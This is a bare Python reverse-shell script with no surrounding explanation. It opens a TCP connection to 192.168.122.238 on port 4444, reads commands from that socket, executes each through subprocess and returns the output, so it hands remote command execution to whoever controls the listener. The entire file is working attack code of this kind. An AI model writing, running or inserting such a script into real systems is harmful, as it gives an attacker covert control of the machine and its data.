import socket
import subprocess

IP = "192.168.122.238"
PORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, PORT))

while True:
    cmd = sock.recv(1024).decode().strip()
    if not cmd:
        break

    if cmd.lower() == "exit":
        break

    output = subprocess.getoutput(cmd)
    sock.send((output + "\n").encode())


sock.close()


